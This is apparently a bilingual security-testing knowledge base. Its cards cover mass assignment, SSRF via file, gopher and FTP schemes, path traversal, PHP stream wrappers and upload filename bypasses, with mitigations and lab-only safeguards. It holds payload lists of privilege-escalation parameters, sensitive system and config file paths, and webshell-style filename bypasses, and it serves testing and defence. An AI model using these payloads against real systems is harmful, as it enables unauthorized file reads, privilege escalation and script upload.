mitigation.en: Use explicit allowlisted fields for every DTO and block client writes to role, owner, authentication, and internal-mode data. Derive identity only from verified sessions or tokens and authorize server-side by principal, object, and action. Use a separate reauthenticated audited flow for role changes.

title.zh: 建立普通用户对象基线

description.zh: 记录规范请求、数据库对象、最终主体和对管理测试资源的拒绝。
description.en: Record the canonical request, database object, final principal, and denial of the administrative test resource.

title.zh: 单字段提交权限参数
title.en: Submit privilege parameters one field at a time

description.zh: 逐条加入管理员、角色、用户、认证或调试字段，保持其余请求不变。
description.en: Add admin, role, user, authenticated, or debug fields individually while holding the rest of the request constant.

attackChain.payload:
admin=true
isAdmin=1
role=admin
user=admin
authenticated=true
is_admin=true
debug=true
test=test

title.zh: 核对持久化与对象授权

description.zh: 检查敏感字段是否写入、主体是否改变，以及管理测试操作是否真正被服务端批准。
description.en: Inspect sensitive-field persistence, principal changes, and whether the server actually approves the administrative test action.

title.zh: 应用字段允许列表并回归

description.zh: 移除通用绑定并强化授权后重放参数，确认正常可编辑字段保留且安全字段被忽略或拒绝。
description.en: After removing generic binding and enforcing authorization, replay parameters to preserve valid editable fields while security fields are rejected or ignored.

analysis.zh: 前端显示变化与服务端越权必须分开。最强证据是敏感属性持久化、最终主体改变或对象级授权通过；单纯响应包含输入不足。
analysis.en: Separate UI changes from server-side privilege. Strong evidence is persisted sensitive state, a changed final principal, or successful object authorization; reflected input is insufficient.

opsecTips.zh: 只对专用测试账号和可回滚对象尝试字段变更。
opsecTips.en: Attempt field changes only on dedicated test accounts and rollback-safe objects.

opsecTips.zh: 每次测试后还原数据库对象并核对审计日志，避免权限残留。
opsecTips.en: Restore the database object and inspect audit logs after every test to prevent residual privilege.

name.zh: SSRF file URI 本地文件读取
name.en: SSRF file URI Local File Read

description.zh: 使用 Linux 与 Windows file URI 验证服务端 URL 获取器是否允许读取本地文件。
description.en: Uses Linux and Windows file URIs to test whether a server-side URL fetcher permits local-file reads.

prerequisites.zh: 目标功能由服务端获取用户提供的 URL
prerequisites.en: A server-side feature fetches a user-provided URL.

prerequisites.zh: 隔离环境提供无敏感本地标记文件和文件访问遥测
prerequisites.en: The isolated environment provides a nonsensitive local marker and file-access telemetry.

title.zh: 本地资源 URI 样例

description.zh: 按服务端操作系统和 URL 库选择对应行，并把真实系统文件替换为隔离标记；不同协议逐条测试。
description.en: Select the line matching the server OS and URL library, replace real system files with an isolated marker, and test schemes individually.

overview.zh: 服务端 URL 获取不一定只支持 HTTP；底层库可能识别 file 协议并返回本机资源。测试必须证明读取动作发生在服务端组件，而不是浏览器处理、客户端预览或输入字符串回显。
overview.en: Server-side URL retrieval may support more than HTTP. A lower-level library can resolve file URIs and return local resources. Testing must prove that the server component performed the read, not a browser, client preview, or reflected string.

vulnerability.zh: 根因是只校验 URL 字符串或主机，却未对解析后的 scheme 建立允许列表。通用 URL 库随后分派到本地文件处理器，应用进程权限决定可读范围，绕过了原本预期的网络边界。
vulnerability.en: The root cause is validating a URL string or host without allowlisting the parsed scheme. A generic URL library dispatches to a local-file handler, and application-process privileges define what can be read, bypassing the intended network-only boundary.

exploitation.zh: 先用自有 HTTP URL 证明请求确实由服务端发起，再逐条提交与平台匹配的本地协议，并将目标指向无敏感标记。通过响应标记、文件访问日志或调用栈确认。400、协议不支持或客户端下载均为阴性。
exploitation.en: First use a controlled HTTP URL to prove server-side retrieval, then submit a platform-matching local scheme pointed at a nonsensitive marker. Confirm through marker output, file-access logs, or call traces. A 400, unsupported scheme, or client-side download is negative.

mitigation.zh: 解析 URL 后只允许明确需要的 HTTP/HTTPS，拒绝 file 及未知协议，并在每次重定向后重新校验。让获取服务运行在无敏感文件访问的隔离身份中，限制文件系统和网络，并记录拒绝原因。
mitigation.en: After parsing, allow only required HTTP or HTTPS schemes, reject file and unknown schemes, and revalidate after every redirect. Run the fetcher with an isolated identity that cannot read sensitive files, constrain filesystem and network access, and log rejections.

title.zh: 确认服务端获取路径

description.zh: 使用自有 HTTP 标记与请求日志证明 URL 由后端获取器处理。
description.en: Use a controlled HTTP marker and request logs to prove that the backend fetcher processes the URL.

title.zh: 提交平台匹配的 file URI

description.zh: 把示例文件改为测试标记，逐平台提交并记录服务端请求 ID。
description.en: Replace example files with a test marker, submit by platform, and record the server request ID.

title.zh: 确认本地文件访问

description.zh: 关联响应标记、文件审计或调用栈，排除浏览器和客户端侧协议处理。
description.en: Correlate marker output, file audit, or call traces and exclude browser or client-side scheme handling.

title.zh: 限制协议与权限后回归
title.en: Regress after scheme and privilege restrictions

description.zh: 只保留业务所需协议后重放正常 HTTP 与本地 URI，确认前者可用而后者拒绝。
description.en: After retaining only business-required schemes, replay normal HTTP and local URIs to preserve the former and reject the latter.

analysis.zh: 关键是归因到服务器端进程及其文件权限。页面中出现路径或客户端打开 file URI 都不构成 SSRF 本地读取。
analysis.en: Attribution to the server process and its filesystem privileges is essential. A path in a page or a client opening a file URI is not server-side local access.

opsecTips.zh: 将所有系统文件目标替换为无敏感标记，并在测试容器限制读取权限。
opsecTips.en: Replace every system-file target with a nonsensitive marker and restrict read permissions in the test container.

opsecTips.zh: 不要通过接口读取应用日志本身，以免报告中带出其他用户数据。
opsecTips.en: Do not retrieve application logs through the interface because they may contain other users' data.

name.zh: Gopher SSRF 到 Redis 协议

description.zh: 使用编码后的 Redis 协议帧验证 URL 获取器是否允许 gopher 连接内网服务并发送应用层字节。
description.en: Uses an encoded Redis protocol frame to test whether a URL fetcher permits gopher connections to internal services and transmits application-layer bytes.

prerequisites.zh: 目标 URL 库可能支持 gopher 协议
prerequisites.en: The target URL library may support the gopher scheme.

prerequisites.zh: 隔离网络中提供只读测试 Redis 或协议捕获服务
prerequisites.en: An isolated network provides a read-only test Redis or protocol-capture service.

title.zh: 编码 Redis 帧的 Gopher URI
title.en: Gopher URI with an Encoded Redis Frame

description.zh: 只对隔离协议捕获器或专用测试 Redis 使用，并将帧替换为无状态只读命令；原行用于保留数据集语义。
description.en: Use only against an isolated protocol capture service or dedicated test Redis and replace the frame with a stateless read-only command; the original line is retained for dataset fidelity.

overview.zh: Gopher 可让某些通用 URL 库向任意 TCP 服务写入受控字节，因此比普通 HTTP SSRF 更接近协议桥接。确认需要在隔离服务端看到预期字节和来源连接；仅有超时、连接错误或 URL 被接受不足。
overview.en: Gopher can let some generic URL libraries write controlled bytes to arbitrary TCP services, making it protocol bridging rather than ordinary HTTP SSRF. Confirmation requires the expected bytes and source connection at an isolated service; acceptance, timeout, or connection errors are insufficient.

vulnerability.zh: 根因是获取器允许用户控制 scheme、host、port 与数据段，且网络层允许应用访问内网 Redis。百分号解码后数据被直接写入套接字，可能越过无认证或仅绑定内网的服务边界。
vulnerability.en: The cause is a fetcher allowing user-controlled scheme, host, port, and data while network policy permits access to internal Redis. Percent-decoded bytes are written to the socket, crossing a service boundary that may rely on internal binding rather than authentication.

exploitation.zh: 先把目标改为隔离协议捕获器，提交唯一无害帧并检查原始字节、源地址和时间。确认 gopher 传输后，最多在专用 Redis 上使用只读 PING 类命令。不得对生产 Redis 写键、改配置或触发模块。
exploitation.en: First point the URI to an isolated protocol capture service, submit a unique harmless frame, and inspect raw bytes, source, and time. After proving gopher transport, use at most a read-only PING-like operation on a dedicated Redis. Never write keys, change configuration, or load modules on production.

mitigation.zh: URL 获取器只允许 HTTP/HTTPS 并使用结构化客户端，拒绝 gopher 与非业务端口，解析后和重定向后都检查地址。网络层阻断到 Redis 等数据服务，Redis 启用认证、TLS、ACL 和受限绑定。
mitigation.en: Allow only HTTP or HTTPS through a structured client, reject gopher and nonbusiness ports, and validate resolved addresses before and after redirects. Block access to data services at the network layer and secure Redis with authentication, TLS, ACLs, and restricted binding.

title.zh: 部署隔离协议捕获器
title.en: Deploy an isolated protocol capture service

description.zh: 准备只记录原始字节的测试端点，并确保应用无法访问真实数据服务。
description.en: Prepare a test endpoint that only records raw bytes and ensure the application cannot reach real data services.

title.zh: 提交编码 Gopher 帧

description.zh: 将地址替换为捕获器后发送样例，记录应用请求 ID 和精确时间。
description.en: Replace the address with the capture service, send the sample, and record application request ID and exact time.

title.zh: 确认服务端字节转发

description.zh: 匹配捕获到的解码字节、来源连接和请求时间，排除客户端请求与背景流量。
description.en: Match decoded captured bytes, source connection, and request time, excluding client traffic and background noise.

title.zh: 封禁协议和内网端口
title.en: Block the scheme and internal ports

description.zh: 实施协议允许列表和网络分段后重放，确认正常 HTTP 获取保留而 gopher 无法连接。
description.en: After scheme allowlisting and segmentation, replay to preserve normal HTTP retrieval while gopher cannot connect.

analysis.zh: 确认点是 URL 输入导致应用服务器向捕获器发送可控协议字节。仅能扫描端口或观察连接失败时，应归为有限 SSRF 线索而非 Redis 协议利用。
analysis.en: The confirmation point is attacker input causing the application server to send controlled protocol bytes. Port scanning or connection failures alone indicate limited SSRF evidence, not Redis protocol exploitation.

opsecTips.zh: 只连接隔离捕获器，禁止对真实 Redis 使用写入、配置或持久化命令。
opsecTips.en: Connect only to an isolated capture service and never use write, configuration, or persistence commands on real Redis.

opsecTips.zh: 单次提交唯一短帧并及时关闭监听，降低内网扫描与日志噪声。
opsecTips.en: Submit one unique short frame and close the listener promptly to minimize internal scanning and log noise.

name.zh: FTP、TFTP 与 Netdoc 协议 SSRF
name.en: FTP, TFTP, and Netdoc Scheme SSRF

description.zh: 使用 FTP、TFTP 与 Netdoc URI 验证服务端获取器是否允许访问非 HTTP 协议、受限端口或本地资源处理器。
description.en: Uses FTP, TFTP, and Netdoc URIs to test whether a server-side fetcher can access non-HTTP protocols, restricted ports, or local-resource handlers.

subCategory.zh: 非 HTTP 文件与资源协议

prerequisites.zh: 服务端功能接受完整 URL 并由通用传输库处理
prerequisites.en: A server-side feature accepts a full URL handled by a generic transfer library.

prerequisites.zh: 隔离环境部署无文件内容的 FTP/TFTP 监听器和无敏感 Netdoc 标记
prerequisites.en: An isolated environment hosts empty FTP or TFTP listeners and a nonsensitive Netdoc marker.

title.zh: FTP/TFTP/Netdoc URI 样例
title.en: FTP, TFTP, and Netdoc URI Samples

description.zh: 将回环地址替换为授权隔离监听器，逐协议请求并关联服务端连接日志；不下载或上传真实文件。
description.en: Replace loopback with an authorized isolated listener, request each scheme separately, and correlate server-side connections without downloading or uploading real files.

overview.zh: FTP/TFTP/Netdoc 支持说明获取器的协议面超过业务预期，并可能跨越网络或本地资源边界。URL 被语法接受不等于访问成功；网络协议需监听器握手，Netdoc 需服务端标记读取。
overview.en: FTP, TFTP, or Netdoc support shows a protocol surface beyond business need and may cross network or local-resource boundaries. URL acceptance is not access; network schemes require a listener handshake and Netdoc requires a server-side marker read.

vulnerability.zh: 根因是没有在解析后限制 scheme 和目标，通用库自动启用 FTP/TFTP/Netdoc。过宽网络或文件权限可允许内部服务探测、文件访问或额外协议请求。
vulnerability.en: The cause is failing to restrict parsed schemes and targets while a generic library enables FTP, TFTP, or Netdoc. Broad network or filesystem privilege can permit internal probing, file access, or extra protocol requests.

exploitation.zh: 先用自有 HTTP 端点建立服务端请求基线，再把 FTP/TFTP 指向隔离监听器、Netdoc 指向无敏感标记并逐条测试。网络连接或文件访问必须与请求关联；DNS、客户端导航和超时不足。
exploitation.en: Baseline server-side retrieval with a controlled HTTP endpoint, point FTP or TFTP to isolated listeners and Netdoc to a nonsensitive marker, and test separately. Network or file access must correlate to the request; DNS, client navigation, and timeout are insufficient.

mitigation.zh: 使用只支持所需 HTTP/HTTPS 的客户端并拒绝其他协议，解析和 DNS 后检查目标，重定向时重复校验。限制网络与文件权限，移除不需要的 FTP/TFTP/Netdoc 处理能力。
mitigation.en: Use a client limited to required HTTP or HTTPS and reject other schemes, validate targets after parsing and DNS and after redirects, restrict network and filesystem privileges, and remove unused FTP, TFTP, or Netdoc support.

title.zh: 建立 HTTP 获取基线

description.zh: 以自有 HTTP 标记确认 URL 由服务端请求并记录其源网络位置。
description.en: Use a controlled HTTP marker to confirm server-side retrieval and record its network source.

title.zh: 逐协议指向隔离目标
title.en: Point each scheme to isolated targets

description.zh: FTP/TFTP 使用授权监听器，Netdoc 使用标记资源，逐条提交并记录请求 ID。
description.en: Use authorized listeners for FTP or TFTP and a marker resource for Netdoc, submit separately, and record request IDs.

title.zh: 确认应用侧协议连接

description.zh: 匹配握手、来源和时间，排除 DNS 预取、浏览器连接与背景服务。
description.en: Match handshake, source, and timing while excluding DNS prefetch, browser connections, and background services.

title.zh: 实施协议允许列表

description.zh: 修复后重放 HTTP、FTP、TFTP 与 Netdoc，确认业务 HTTP 保留而其他协议拒绝。
description.en: After remediation replay HTTP, FTP, TFTP, and Netdoc to preserve business HTTP while rejecting the other schemes.

analysis.zh: 区分 DNS 解析、TCP/UDP 连接和协议级请求三个层次。只有监听器中的应用源连接与请求内容能证明相应协议可用。
analysis.en: Distinguish DNS resolution, TCP or UDP connection, and protocol-level request. Only an application-origin connection and request content at the listener prove scheme support.

opsecTips.zh: 监听器不提供真实文件且部署在隔离网段，避免测试成为数据传输通道。
opsecTips.en: Listeners should expose no real files and run in an isolated segment so testing cannot become a data channel.

opsecTips.zh: 每个协议只进行一次短连接并设置严格超时，避免阻塞工作线程。
opsecTips.en: Make one short connection per scheme with strict timeouts to avoid blocking worker threads.

name.zh: 路径遍历编码与分隔符变体
name.en: Path Traversal Encoding and Separator Variants

description.zh: 使用双重编码、过长 UTF-8、空字节、重复点段和反斜杠测试文件路径在多层解码后的根目录约束。
description.en: Uses double encoding, overlong UTF-8, null bytes, repeated dot segments, and backslashes to test root enforcement after multilayer path decoding.

prerequisites.zh: 目标参数参与服务端文件读取、下载、解压或模板路径选择
prerequisites.en: A target parameter controls server-side file read, download, extraction, or template selection.

prerequisites.zh: 测试根目录外准备无敏感标记文件并启用文件访问审计
prerequisites.en: A nonsensitive marker outside the test root and file-access auditing are available.

title.zh: 路径解码差异样例

description.zh: 逐条替换目标路径参数，并把系统文件改为隔离标记；记录每个代理、框架和文件 API 看到的解码值。
description.en: Substitute each line into the path parameter, replace system files with an isolated marker, and record decoded values at every proxy, framework, and file API.

overview.zh: 路径遍历的关键不是原始输入是否包含 ../，而是所有解码与规范化完成后，文件 API 得到的真实路径是否离开允许根目录。不同平台对反斜杠、过长 UTF-8 和 NUL 的处理不同，应按实际技术栈逐条验证。
overview.en: Path traversal is determined not by ../ in raw input but by whether the final path passed to the file API escapes the allowed root after all decoding and canonicalization. Backslashes, overlong UTF-8, and NUL handling vary by stack and require targeted testing.

vulnerability.zh: 根因是边界层在一次解码前过滤危险片段，而应用、路由器或文件库再次解码并折叠点段。若只检查字符串前缀而不比较规范绝对路径，编码分隔符和平台转换可能恢复父目录语义。
vulnerability.en: The cause is filtering dangerous fragments before one decode while the application, router, or file library decodes again and collapses dot segments. String-prefix checks without canonical absolute-path comparison let encoded separators and platform conversion restore parent traversal.

exploitation.zh: 用允许目录内文件建立基线，将每个样例的目标替换为目录外测试标记并逐条发送。关联原始输入、各层解码值、规范路径和文件访问日志。只有标记内容或越界文件访问成立；软 404、错误码和过滤告警不足。
exploitation.en: Baseline an allowed file, replace each sample target with a marker outside the root, and submit separately. Correlate raw input, each decoded value, canonical path, and file audit. Only marker content or an out-of-root read proves the issue; soft 404s, status changes, and filter alerts do not.

mitigation.zh: 用服务端对象 ID 映射文件而不是接受路径。必须处理路径时，完成全部解码后解析规范绝对路径，验证其严格位于固定根目录且不经符号链接越界；拒绝 NUL、未知编码和跨平台分隔符，并在文件 API 前最后校验。
mitigation.en: Map server-side object IDs to files instead of accepting paths. If paths are required, fully decode, resolve the canonical absolute path, enforce a fixed root and no symlink escape, reject NUL and unknown encodings or separators, and perform the final check immediately before file access.

title.zh: 记录合法文件路径基线

description.zh: 确认输入经过哪些解码层以及最终文件 API 的根目录和规范路径。
description.en: Identify decoding layers, the final file API root, and canonical path for a valid file.

title.zh: 逐条提交编码变体

description.zh: 把系统目标替换为目录外标记，逐条发送并记录各层路径。
description.en: Replace system targets with an out-of-root marker, send each line, and record paths at every layer.

title.zh: 确认最终路径越界

description.zh: 用规范路径、文件访问遥测或标记内容证明文件 API 越过允许根目录。
description.en: Use canonical path, file-access telemetry, or marker content to prove that the file API escaped the allowed root.

title.zh: 在文件 API 前强制根约束
title.en: Enforce the root before file access

description.zh: 修复后重放合法路径与全部编码变体，确认仅合法对象可访问。
description.en: After remediation replay valid paths and every encoding variant to confirm only allowed objects are accessible.

analysis.zh: 报告应同时给出原始值、完全解码值、规范绝对路径和实际文件操作。仅证明 WAF 与应用解码不同，还不能证明目录越界。
analysis.en: Report raw value, fully decoded value, canonical absolute path, and actual file operation. A WAF/application decoding difference alone does not prove directory escape.

opsecTips.zh: 所有敏感路径替换为隔离标记，禁止读取真实账户、日志和配置文件。
opsecTips.en: Replace every sensitive path with an isolated marker and do not read real account, log, or configuration files.

opsecTips.zh: 按目标平台选择有限变体并限速，避免大量无关错误污染日志。
opsecTips.en: Choose a small platform-specific set and rate-limit it to avoid irrelevant error-log noise.

name.zh: 敏感本地文件与应用配置路径
name.en: Sensitive Local File and Application Configuration Paths

description.zh: 按 Linux、Windows 与 Java Web 技术栈组织常见本地文件目标，用于确认文件读取边界及数据敏感度。
description.en: Organizes common Linux, Windows, and Java web local-file targets to confirm file-read boundaries and data sensitivity.

prerequisites.zh: 已通过无敏感标记确认存在文件读取数据流
prerequisites.en: A file-read data flow has already been confirmed with a nonsensitive marker.

prerequisites.zh: 测试授权明确允许按平台核对敏感文件边界
prerequisites.en: Authorization explicitly permits platform-specific sensitive-file boundary checks.

title.zh: 跨平台本地文件目标

execution.command:
/proc/cpuinfo
/var/log/apache/access.log
/var/log/syslog
/var/log/httpd/access_log
C:\windows\system32\drivers\etc\hosts
C:\windows\win.ini
c:/windows/system32/drivers/etc/hosts
c:/windows/win.ini
c:/boot.ini
file:///c:/windows/win.ini
WEB-INF/web.xml
/WEB-INF/web.xml
WEB-INF/classes/application.properties

description.zh: 只选择与已确认操作系统和框架匹配的目标；优先改为同目录中的测试标记，真实文件仅用于授权后的最小元数据确认。
description.en: Select only targets matching the confirmed OS and framework; prefer same-directory test markers, using real files only for minimal metadata confirmation when explicitly authorized.

overview.zh: 文件目标清单用于在已确认文件读取后评估影响，不适合无差别扫描。不同平台路径能帮助判断应用进程可见的文件系统，但最小证据应优先使用测试标记，避免把真实日志、主机信息或配置带入报告。
overview.en: This target list assesses impact after a file-read primitive is confirmed and is not for indiscriminate scanning. Platform paths help identify the process-visible filesystem, but minimal evidence should use test markers to avoid collecting real logs, host data, or configuration.

vulnerability.zh: 根因是文件读取接口允许用户选择任意绝对或应用相对路径，并以应用权限返回内容。日志可含令牌，web.xml 与 application.properties 可含内部路由或密钥，系统文件可暴露主机信息。
vulnerability.en: The root cause is a file-read interface allowing arbitrary absolute or application-relative paths and returning content with process privileges. Logs may contain tokens, web.xml or application.properties may reveal routes or secrets, and system files disclose host details.

exploitation.zh: 先用专用标记证明任意读取，再根据已知平台选择一条最低敏感目标并只验证存在性、固定前缀或哈希，不保存完整内容。关联文件访问日志和响应。错误页包含路径或静态文档示例不算实际读取。
exploitation.en: First prove arbitrary read with a dedicated marker, then choose one lowest-sensitivity target for the known platform and verify only existence, a fixed prefix, or hash rather than retaining full content. Correlate file audit and response. Error pages containing a path or documentation examples are not file reads.

mitigation.zh: 将客户端输入映射到允许对象 ID，禁止绝对路径和任意相对路径；文件服务在最小权限沙箱中运行，不能读取应用配置与系统日志。对日志中的密钥脱敏并轮换任何已确认暴露的凭据。
mitigation.en: Map client input to allowed object IDs and reject absolute or arbitrary relative paths. Run file services in a least-privilege sandbox without access to configuration or system logs. Redact secrets from logs and rotate any credential proven exposed.

title.zh: 用标记确认读取原语
title.en: Confirm the read primitive with a marker

description.zh: 在不读取真实数据的情况下证明服务端文件 API 可访问允许目录外标记。
description.en: Prove the server file API can access an out-of-root marker without reading real data.

title.zh: 选择平台匹配的最小目标

description.zh: 按已知操作系统和框架只选择一行，并限制为存在性或固定前缀验证。
description.en: Select one line for the known OS and framework and limit verification to existence or a fixed prefix.

attackChain.payload:
/proc/cpuinfo
/var/log/apache/access.log
/var/log/syslog
/var/log/httpd/access_log
C:\windows\system32\drivers\etc\hosts
C:\windows\win.ini
c:/windows/system32/drivers/etc/hosts
c:/windows/win.ini
c:/boot.ini
file:///c:/windows/win.ini
WEB-INF/web.xml
/WEB-INF/web.xml
WEB-INF/classes/application.properties

title.zh: 评估应用权限暴露

description.zh: 关联访问审计，确认应用进程实际读取并对数据类型与敏感度分级。
description.en: Correlate access audit, confirm an actual process read, and classify the data type and sensitivity.

title.zh: 隔离文件权限并回归

description.zh: 实施对象映射与最小权限后，重放合法文件和匹配目标，确认越界读取被拒绝。
description.en: After object mapping and least privilege, replay valid files and matching targets to confirm out-of-bound reads are denied.

analysis.zh: 该卡用于影响确认而非发现阶段。成功证据应最小化为文件存在、固定非敏感片段或审计事件，并说明应用身份的实际读取范围。
analysis.en: This card is for impact confirmation, not discovery. Minimize evidence to existence, a fixed nonsensitive fragment, or an audit event and state the actual read scope of the application identity.

opsecTips.zh: 不下载完整日志或配置；截图和报告中遮盖所有令牌、主机名和个人数据。
opsecTips.en: Do not download full logs or configuration; redact tokens, hostnames, and personal data from evidence.

opsecTips.zh: 每个平台只验证一个最低敏感目标，取得结论后立即停止。
opsecTips.en: Verify one lowest-sensitivity target per platform and stop as soon as the conclusion is established.

name.zh: PHP Stream Wrapper 文件包含

description.zh: 使用 php、data、zip 与 phar wrapper 验证文件包含或读取参数是否允许非文件流、归档成员和序列化元数据进入 PHP 处理链。
description.en: Uses php, data, zip, and phar wrappers to test whether inclusion or read parameters admit nonfile streams, archive members, or serialization metadata into PHP processing.

prerequisites.zh: 目标由 PHP 处理并存在文件读取、包含或归档访问参数
prerequisites.en: The target runs PHP and exposes a file-read, include, or archive-access parameter.

prerequisites.zh: 可在隔离测试实例中控制无敏感资源和归档文件
prerequisites.en: Nonsensitive resources and archives are controllable in an isolated test instance.

title.zh: PHP 流与归档 Wrapper

description.zh: 逐 wrapper、逐目标测试，并把系统文件、代码与归档全部替换为隔离的无害标记；data: 与 data:// 是不同解析路径。
description.en: Test one wrapper and target at a time and replace system files, code, and archives with harmless isolated markers; data: and data:// exercise different parsing paths.

overview.zh: PHP Stream Wrapper 把文件 API 扩展到过滤器、请求体、内联数据和归档。每个 wrapper 的风险取决于函数是读取还是 include、配置是否允许 URL include，以及是否触发 phar 元数据处理；不能把 wrapper 字符串被接受直接等同于代码执行。
overview.en: PHP stream wrappers extend file APIs to filters, request bodies, inline data, and archives. Risk depends on read versus include behavior, URL-include settings, and phar metadata handling. Acceptance of a wrapper string does not itself mean code execution.

vulnerability.zh: 根因是用户输入直接进入 fopen、file_get_contents、include 或归档 API，且未限制 wrapper scheme 和目标。读取函数可能泄露源码，include 可能解释流内容，phar/zip 还可能跨入归档成员或对象元数据处理。
vulnerability.en: The root cause is user input reaching fopen, file_get_contents, include, or archive APIs without restricting wrapper scheme and target. Read functions can disclose source, include can interpret stream content, and phar or zip can cross into archive members or object metadata.

exploitation.zh: 先通过代码或日志确定具体 PHP API，再选择与该 API 匹配的一个 wrapper，使用无害标记文件、纯文本请求体或测试归档。观察标记读取、解码输出或受控无副作用执行。错误、回显 URI 或上传成功不能证明 wrapper 被处理。
exploitation.en: Identify the exact PHP API from code or logs, then choose one matching wrapper and use a harmless marker file, plain-text request body, or test archive. Observe marker reads, decoded output, or controlled side-effect-free execution. Errors, URI reflection, or upload success do not prove wrapper processing.

mitigation.zh: 不要把用户输入传给 include/require；读取文件时使用服务端对象映射和固定根目录，只允许明确的 file 资源。关闭不需要的 allow_url_include，限制上传目录不可执行，升级 PHP 与依赖，并审计 phar/zip 处理和反序列化路径。
mitigation.en: Never pass user input to include or require. For reads, use server-side object mapping and a fixed root and allow only explicit file resources. Disable unneeded allow_url_include, keep upload storage nonexecutable, patch PHP and dependencies, and audit phar or zip and deserialization paths.

title.zh: 识别 PHP 文件 API

description.zh: 确认输入进入读取、包含还是归档函数，并记录 PHP 配置与 wrapper 支持。
description.en: Determine whether input reaches a read, include, or archive function and record PHP configuration and wrapper support.

title.zh: 提交匹配的无害 Wrapper

description.zh: 把所有敏感目标和代码替换为测试标记，逐 wrapper 提交并关联日志。
description.en: Replace sensitive targets and code with test markers, submit one wrapper at a time, and correlate logs.

title.zh: 确认实际流处理结果

description.zh: 通过标记输出、解码内容、归档成员访问或受控执行证明对应 wrapper 被后端处理。
description.en: Use marker output, decoded content, archive-member access, or controlled execution to prove backend wrapper handling.

title.zh: 限制 Wrapper 与包含边界

description.zh: 改用对象映射并关闭不需要的 wrapper 后重放，确认合法文件功能保留且所有样例拒绝。
description.en: After object mapping and disabling unnecessary wrappers, replay to preserve valid file behavior while rejecting every sample.

analysis.zh: 应明确每行对应的 PHP API、配置前提与实际结果：源码读取、流解析、归档访问和代码解释是不同风险，不能合并评级。
analysis.en: State the PHP API, configuration prerequisite, and actual result for each line. Source read, stream parsing, archive access, and code interpretation are distinct risks and should not share one severity automatically.

opsecTips.zh: 使用只含固定标记的测试文件/归档，不读取配置或提交可执行系统命令。
opsecTips.en: Use test files and archives containing only fixed markers; do not read configuration or submit executable system commands.

opsecTips.zh: 每次只验证一个 wrapper，并在结束后删除上传的测试归档和请求体缓存。
opsecTips.en: Validate one wrapper at a time and remove uploaded test archives and request-body caches afterward.

name.zh: PHP 上传文件名与扩展名绕过
name.en: PHP Upload Filename and Extension Bypass

description.zh: 使用替代 PHP 扩展、双扩展、大小写、控制字符、分号、冒号与 NTFS ADS 变体，验证上传校验与 Web 服务器执行映射是否一致。
description.en: Uses alternative PHP extensions, double extensions, casing, controls, semicolons, colons, and NTFS ADS variants to test consistency between upload validation and web-server execution mapping.

subCategory.zh: 上传扩展名与文件名解析差异
subCategory.en: Upload Extension and Filename Parsing Differentials

prerequisites.zh: 目标允许上传文件并可观察最终存储名与服务方式
prerequisites.en: The target permits uploads and exposes the final stored name and serving behavior.

prerequisites.zh: 隔离实例使用无害文本标记而非 WebShell 作为文件内容
prerequisites.en: An isolated instance uses harmless text markers rather than webshell content.

title.zh: PHP 文件名变体

execution.command:
shell.php5
shell.phtml
shell.pht
shell.php.jpg
shell.php.png
shell.php%00.jpg
shell.php%00.png
shell.php;.jpg
shell.php;.png
shell.php%0a
shell.php%0d%0a
shell.php.jpg.php
shell.php.png.php
shell.pHp
shell.PHP
shell.pHP5
shell.php:.jpg
shell.php:.png
shell.php::$DATA
shell.php::$DATA%00

description.zh: 逐文件名上传同一无害文本标记，记录入口校验名、规范存储名、响应 Content-Type 和是否落入可执行处理器。
description.en: Upload the same harmless text marker under each filename and record validated name, canonical stored name, response Content-Type, and whether an executable handler is selected.

overview.zh: 上传绕过由多个解析器共同决定：浏览器 multipart 名、应用校验、文件系统规范化、反向代理与 Web 服务器处理器映射。某个文件名被接受不等于代码执行，必须确认最终内容被置于可执行位置并由服务器端解释。
overview.en: Upload bypass depends on browser multipart naming, application validation, filesystem canonicalization, proxy behavior, and web-server handler mapping. Filename acceptance is not code execution; the final content must be stored in an executable location and interpreted server-side.

vulnerability.zh: 根因是仅检查最后扩展名或原始文件名，而下游对大小写、分号、控制字符、双扩展或 NTFS 数据流采用不同规则。若上传目录可执行，校验为图片的文件仍可能映射到 PHP 处理器。
vulnerability.en: The cause is validating only the last extension or raw filename while downstream layers treat case, semicolons, controls, double extensions, or NTFS streams differently. If upload storage is executable, a file accepted as an image may still map to PHP.

exploitation.zh: 在隔离实例逐个文件名上传相同纯文本标记，记录每层文件名与真实磁盘路径，再通过 HEAD/GET 检查媒体类型和处理器日志。只有服务器端解释无害模板标记或路由到脚本处理器才成立；下载、重命名或静态文本返回是安全结果。
exploitation.en: In isolation, upload the same plain-text marker under each filename, record names and disk path at every layer, then inspect media type and handler logs with HEAD or GET. A finding requires server-side interpretation of a harmless template marker or script-handler routing; download, renaming, or static text is safe behavior.

mitigation.zh: 使用服务端随机对象 ID 存储在 Web 根目录之外，上传目录明确不可执行。按允许列表同时验证规范扩展名、MIME 和内容签名，拒绝控制字符、保留名、ADS 和多重扩展；下载通过固定处理器设置安全 Content-Type 与附件头。
mitigation.en: Store server-generated random object IDs outside the web root and make upload storage nonexecutable. Allowlist canonical extension, MIME, and content signature together; reject controls, reserved names, ADS, and multiple extensions. Serve downloads through a fixed handler with safe Content-Type and attachment headers.

title.zh: 记录安全上传基线

description.zh: 上传无害文本或图片，记录原始名、规范名、磁盘位置和下载处理器。
description.en: Upload a harmless text or image file and record original name, canonical name, disk location, and download handler.

title.zh: 逐文件名上传相同标记
title.en: Upload one filename variant at a time

description.zh: 保持内容为同一纯文本标记，只改变文件名并捕获各层规范化结果。
description.en: Keep the content as the same plain-text marker, change only the filename, and capture canonicalization at every layer.

attackChain.payload:
shell.php5
shell.phtml
shell.pht
shell.php.jpg
shell.php.png
shell.php%00.jpg
shell.php%00.png
shell.php;.jpg
shell.php;.png
shell.php%0a
shell.php%0d%0a
shell.php.jpg.php
shell.php.png.php
shell.pHp
shell.PHP
shell.pHP5
shell.php:.jpg
shell.php:.png
shell.php::$DATA
shell.php::$DATA%00

title.zh: 确认最终处理器行为

description.zh: 检查服务器映射、媒体类型和处理日志，区分静态下载、拒绝、重命名与服务器端解释。
description.en: Inspect handler mapping, media type, and processing logs to distinguish static download, denial, renaming, and server-side interpretation.

title.zh: 迁移到不可执行对象存储

description.zh: 实施随机存储名和内容验证后重放全部文件名，确认合法上传保留且没有脚本处理。
description.en: After random storage names and content validation, replay every filename to preserve valid uploads without script handling.

analysis.zh: 上传成功、文件可访问和代码可执行是三个不同阶段。报告必须给出最终规范文件名、存储位置与处理器证据，不能从扩展名推断执行。
analysis.en: Upload acceptance, file accessibility, and code execution are separate stages. Report the final canonical name, storage location, and handler evidence rather than inferring execution from an extension.

